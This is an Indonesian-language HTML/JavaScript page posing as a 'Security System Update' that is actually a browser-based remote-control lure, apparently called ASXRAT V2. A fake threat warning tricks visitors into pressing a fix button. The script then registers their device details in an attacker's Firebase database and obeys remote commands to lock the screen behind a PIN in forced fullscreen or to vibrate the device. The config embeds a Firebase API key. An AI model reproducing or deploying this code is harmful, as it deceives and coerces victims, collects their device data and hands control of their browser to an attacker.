<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security System Update</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <style>
        :root { --red: #ff0000; --bg: #000; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        
        .container { text-align: center; padding: 20px; width: 90%; }
        .icon-warn { font-size: 60px; color: var(--red); margin-bottom: 20px; animation: blink 1s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        
        h2 { font-size: 20px; margin-bottom: 10px; text-transform: uppercase; }
        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
        
        .btn-update { background: var(--red); color: #fff; border: none; padding: 18px 40px; border-radius: 50px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 0 20px rgba(255,0,0,0.5); width: 100%; max-width: 280px; }

        /* TAMPILAN LOCK ASXRAT (JANGAN DIHAPUS) */
        #lock-screen { 
            display: none; position: fixed; inset: 0; background: #000; z-index: 99999; 
            flex-direction: column; align-items: center; justify-content: center; padding: 30px; 
        }
        .lock-card { background: #0a0a0a; border: 2px solid var(--red); padding: 40px 20px; border-radius: 35px; text-align: center; width: 100%; max-width: 350px; box-shadow: 0 0 100px rgba(255,0,0,0.8); }
        .lock-card h1 { color: var(--red); font-size: 30px; margin: 0 0 10px 0; font-family: 'Courier New', Courier, monospace; }
        .lock-card p { color: #fff; font-size: 14px; margin-bottom: 25px; }
        .lock-card input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: var(--red); border-radius: 15px; text-align: center; font-size: 20px; font-weight: bold; margin-bottom: 15px; outline: none; box-sizing: border-box; }
        .btn-unlock { background: var(--red); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container" id="ui-infect">
        <div class="icon-warn">⚠️</div>
        <h2>Sistem Terancam!</h2>
        <p>Perangkat Anda terdeteksi memiliki celah keamanan. Harap lakukan pembersihan dan enkripsi sistem segera.</p>
        <button class="btn-update" onclick="startInfection()">FIX SECURITY NOW</button>
    </div>

    <div id="lock-screen">
        <div class="lock-card">
            <h1>LOCKED</h1>
            <p id="msg-display">OWNED BY ASXRAT V2</p>
            <input type="password" id="pin-input" placeholder="ENTER PIN">
            <button class="btn-unlock" onclick="verifyUnlock()">UNLOCK DEVICE</button>
        </div>
    </div>

<script>
    // 🔥 CONFIG FIREBASE (WAJIB SAMA DENGAN CONTROL.HTML) 🔥
    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // 🤖 AMBIL ID PEMILIK LINK (MARIO/USER)
    const params = new URLSearchParams(window.location.search);
    const ownerID = params.get('id') ? atob(params.get('id')) : "Unknown";
    const myID = "TGT-" + Math.floor(Math.random() * 89999 + 10000);
    
    let dbPin = "";

    function startInfection() {
        // Ambil info perangkat
        const model = navigator.userAgent.split('(')[1].split(')')[0];

        // Daftar ke Firebase
        db.ref('mario/targets/' + myID).set({
            model: model || "Android Device",
            belongsTo: ownerID,
            status: "online",
            time: Date.now()
        });

        document.getElementById('ui-infect').innerHTML = "<h2>Processing...</h2><p>Memperbaiki sistem, jangan tutup halaman ini.</p>";

        // 📡 STANDBY TERIMA PERINTAH
        db.ref('mario/commands/' + myID).on('value', snap => {
            const cmd = snap.val();
            if (!cmd) return;

            if (cmd.action === 'lock_screen') {
                dbPin = cmd.pass;
                document.getElementById('msg-display').innerText = cmd.text;
                document.getElementById('lock-screen').style.display = 'flex';
                // Paksa Fullscreen biar ngeri
                document.documentElement.requestFullscreen().catch(() => {});
            } 
            else if (cmd.action === 'unlock') {
                location.reload();
            }
            else if (cmd.action === 'vibrate') {
                if (navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
            }
            else if (cmd.action === 'torch_on') {
                // Flashlight browser-specific logic
            }
        });
    }

    function verifyUnlock() {
        const pin = document.getElementById('pin-input').value;
        if (pin === dbPin) {
            alert("Akses Diterima.");
            location.reload();
        } else {
            alert("PIN SALAH!");
        }
    }
</script>
</body>
</html>
